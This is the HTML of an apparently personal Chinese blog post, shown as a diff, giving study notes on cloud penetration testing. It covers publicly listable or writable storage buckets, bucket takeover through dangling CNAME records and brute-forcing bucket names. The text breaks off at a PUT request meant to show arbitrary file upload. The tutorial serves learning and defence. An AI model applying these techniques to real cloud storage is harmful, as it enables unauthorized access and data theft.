@@ -1,0 +1,1708 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="云安全渗透测试">
+<title>云安全渗透测试</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="云安全渗透测试">
+<meta property='og:description' content="云安全渗透测试">
+<meta property='og:url' content='https://lserein.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-17T12:37:17&#43;08:00'/><meta property='article:modified_time' content='2025-09-17T13:53:20&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo.jpg' />
+<meta name="twitter:title" content="云安全渗透测试">
+<meta name="twitter:description" content="云安全渗透测试"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1存储桶常见漏洞">1.存储桶常见漏洞</a>
+      <ol>
+        <li><a href="#11bucket权限配置错误-公开访问">1.1.Bucket权限配置错误-公开访问</a></li>
+        <li><a href="#12存储桶接管阿里云目前已修复"><strong>1.2.存储桶接管（阿里云目前已修复）</strong></a></li>
+        <li><a href="#13bucket桶爆破">1.3.Bucket桶爆破</a></li>
+        <li><a href="#14任意文件上传与任意文件覆盖">1.4.任意文件上传与任意文件覆盖</a></li>
+        <li><a href="#15存储桶列桶">1.5.存储桶列桶</a>
+          <ol>
+            <li><a href="#151配置问题导致访问直接列桶">1.5.1.配置问题导致访问直接列桶</a></li>
+            <li><a href="#152policy注入导致列桶">1.5.2.Policy注入导致列桶</a></li>
+            <li><a href="#153预签名列桶">1.5.3.预签名列桶</a></li>
+          </ol>
+        </li>
+        <li><a href="#16腾讯云-cos-bucket-acl-可写漏洞">1.6.腾讯云 COS Bucket ACL 可写漏洞</a></li>
+      </ol>
+    </li>
+    <li><a href="#2terraformgoat云场景漏洞靶场搭建">2.TerraformGoat云场景漏洞靶场搭建</a>
+      <ol>
+        <li><a href="#21安装docker">2.1.安装docker</a></li>
+        <li><a href="#22启动项目">2.2.启动项目</a></li>
+        <li><a href="#23开启靶机">2.3.开启靶机</a></li>
+        <li><a href="#24复现漏洞">2.4.复现漏洞</a></li>
+        <li><a href="#25关闭靶机">2.5.关闭靶机</a></li>
+      </ol>
+    </li>
+    <li><a href="#3弹性计算服务漏洞">3.弹性计算服务漏洞</a>
+      <ol>
+        <li><a href="#31腾讯云-cvm-ssrf漏洞">3.1.腾讯云 CVM SSRF漏洞</a></li>
+      </ol>
+    </li>
+    <li><a href="#4k8s常见漏洞">4.K8S常见漏洞</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#51docker未授权漏洞">5.1.Docker未授权漏洞</a>
+      <ol>
+        <li><a href="#511查看版本接口">5.1.1.查看版本接口</a></li>
+        <li><a href="#512查看info目录">5.1.2.查看info目录</a></li>
+        <li><a href="#513查看image镜像">5.1.3.查看image镜像</a></li>
+        <li><a href="#514docker连接未授权端口">5.1.4.Docker连接未授权端口</a></li>
+        <li><a href="#515写公钥getshell">5.1.5.写公钥GetShell</a></li>
+      </ol>
+    </li>
+    <li><a href="#52docker容器逃逸漏洞">5.2.Docker容器逃逸漏洞</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo_hu_d23c1b4f1794582a.jpg"
+                        srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo_hu_d23c1b4f1794582a.jpg 800w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo_hu_c1bfa557faf9ebc.jpg 1600w"
+                        width="800" 
+                        height="510" 
+                        loading="lazy"
+                        alt="Featured image of post 云安全渗透测试" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">云安全渗透测试</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            云安全渗透测试
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 17, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>参考资料：</p>
+<p><a class="link" href="https://www.yuque.com/attachments/yuque/0/2025/xlsx/29033686/1742219504683-e13694ff-92aa-47aa-9ebc-47e9b945426c.xlsx"  target="_blank" rel="noopener"
+    >华为云安全Check List表单.xlsx</a></p>
+<p><a class="link" href="https://www.yuque.com/attachments/yuque/0/2025/docx/29033686/1742219746569-fc6e28d7-1448-4027-8098-8d6be869a12f.docx"  target="_blank" rel="noopener"
+    >华为云安全加固指导书.docx</a></p>
+<p><a class="link" href="https://wiki.teamssix.com/"  target="_blank" rel="noopener"
+    >T Wiki</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/r0DuASP6gH_48b5sJ1DCTw"  target="_blank" rel="noopener"
+    >红队视角下的公有云基础组件安全</a></p>
+<h2 id="1存储桶常见漏洞">1.存储桶常见漏洞
+</h2><p><a class="link" href="https://github.com/libaibaia/BucketVulTools"  target="_blank" rel="noopener"
+    >https://github.com/libaibaia/BucketVulTools</a>       <font style="color:rgb(31, 35, 40);">Burpsuite存储桶配置不当漏洞检测插件</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">腾讯COS</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//cloud.tencent.com/product/cos</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">阿里OSS</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//www.aliyun.com/product/oss</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">百度BOS</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//cloud.baidu.com/product/bos.html</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">华为OBS</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//www.huaweicloud.com/product/obs.html</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">七牛Kodo</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//www.qiniu.com/products/kodo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">又拍云USS</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//www.upyun.com/products/file-storage</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/HXSecurity/TerraformGoat"  target="_blank" rel="noopener"
+    ><strong>https://github.com/HXSecurity/TerraformGoat</strong></a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/C5dM_tF1pFu0bBLLudhtXg"  target="_blank" rel="noopener"
+    >【安全科普】OSS存储桶漏洞总结</a></p>
+<p><a class="link" href="https://zone.huoxian.cn/d/918-oss"  target="_blank" rel="noopener"
+    >阿里云 OSS对象存储攻防</a></p>
+<p><a class="link" href="https://blog.csdn.net/ggqiuhui/article/details/144945056"  target="_blank" rel="noopener"
+    >【云安全】云服务-对象存储-安全问题分析_阿里云oss公共读 安全吗-CSDN博客</a></p>
+<h3 id="11bucket权限配置错误-公开访问">1.1.<font style="color:rgb(17, 17, 17);">Bucket权限配置错误-公开访问</font>
+</h3><p><strong>在创建Bucket桶时，默认是private的权限，如果在错误的配置下，给了listobject权限，就会导致可遍历存储桶，但是现在默认给你开通了阻止公共访问设置（可在 Bucket 创建后，在 OSS 控制台或通过接口来关闭阻止公共访问功能。）</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/1.png"
+	width="1545"
+	height="416"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/1_hu_78eb8434567621a6.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/1_hu_286a3d46a84a3401.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="891px"
+	
+></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/2.png"
+	width="1437"
+	height="1151"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/2_hu_30d2dbbc9415b24c.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/2_hu_8522cf8e9df8ba2f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="299px"
+	
+></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/3.png"
+	width="2181"
+	height="901"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/3_hu_cbe629143b1c3b85.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/3_hu_ef2a0fb005806bd0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="580px"
+	
+></p>
+<p><strong><font style="color:rgb(17, 17, 17);">2、如果想列出Object对象，只需要在Bucket授权策略中设置ListObject即可</font></strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/4.png"
+	width="2303"
+	height="1231"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/4_hu_1bc011abcdfab75e.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/4_hu_f8034ac62eec0718.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="449px"
+	
+></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/5.png"
+	width="2172"
+	height="1211"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/5_hu_ced8957de4d8d3ea.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/5_hu_985a726a72ae1369.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="430px"
+	
+></p>
+<p><strong><font style="color:rgb(77, 77, 77);">第二种情况，是开启了“写”的权限。默认情况未开启，PUT操作返回403</font></strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/6.png"
+	width="2467"
+	height="983"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/6_hu_f7bfd0aeb1e172dc.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/6_hu_e2fae8d9de4b1729.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="602px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">开启后，PUT返回200，成功上传文件</font></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/7.png"
+	width="2336"
+	height="1133"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/7_hu_8b73a3f4a9b4a7c7.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/7_hu_c70e09e58e3e255a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="494px"
+	
+></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/8.png"
+	width="2152"
+	height="887"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/8_hu_cb2e22b209484b61.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/8_hu_64e4512b3036dbe6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p><strong>使用ossx工具可以遍历下载全部文件，工具地址https://github.com/source-xu/oss-x</strong></p>
+<h3 id="12存储桶接管阿里云目前已修复"><strong>1.2.存储桶接管（阿里云目前已修复）</strong>
+</h3><p><strong>利用条件相对苛刻一些，需要域名曾解析并绑定了一个存储桶也就是网站托管，存储桶被删除，但域名解析的 CNAME未删除，此时访问时会显示NoSuchBucket。</strong></p>
+<h3 id="13bucket桶爆破">1.3.Bucket桶爆破
+</h3><p><strong>当不知道 Bucket 名称的时候，可以通过爆破获得 Bucket 名称，这有些类似于目录扫描，只不过目录一般通过状态码判断，这里通过页面的内容判断。</strong></p>
+<p><strong>NoSuchBucket：存储桶不存在。</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/9.png"
+	width="971"
+	height="388"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/9_hu_b66186573b0c991b.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/9_hu_8e5c4a11bf64a17e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="600px"
+	
+></p>
+<p><strong>InvalidBucketName：存储桶的名称不符合规范，属于无效的存储桶名称。</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/10.png"
+	width="1305"
+	height="549"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/10_hu_9097dccd34af6cb9.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/10_hu_ea1a223ba7d33a37.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<p><strong>AccessDenied：存在，但无权限访问。</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/11.png"
+	width="1787"
+	height="685"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/11_hu_dd52e6145287ac80.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/11_hu_38f84576194cd030.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="626px"
+	
+></p>
+<p><strong>成功访问。</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/12.png"
+	width="1460"
+	height="618"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/12_hu_1a630a25b9ed0de0.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/12_hu_76e998d5cdb8e611.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="566px"
+	
+></p>
+<h3 id="14任意文件上传与任意文件覆盖">1.4.任意文件上传与任意文件覆盖
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PUT</span><span class="w"> </span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="na">txt</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
